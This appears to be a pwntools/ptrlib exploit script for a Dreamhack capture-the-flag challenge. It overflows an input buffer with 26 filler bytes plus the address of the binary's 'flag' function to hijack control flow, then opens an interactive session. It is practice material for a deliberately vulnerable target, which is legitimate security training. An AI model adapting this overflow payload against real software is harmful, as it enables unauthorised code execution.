#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./chall")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 17579)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    flag_func = unwrap(exe.symbol("flag"))

    pl = b"cherry"
    pl = pl.ljust(0xF, b"A")
    print(pl)
    io.sendlineafter(": ", pl)

    pl2 = b"B" * 26
    pl2 += ptr.p64(flag_func)
    io.sendlineafter(": ", pl2)

    io.interactive()
    return


if __name__ == "__main__":
    main()
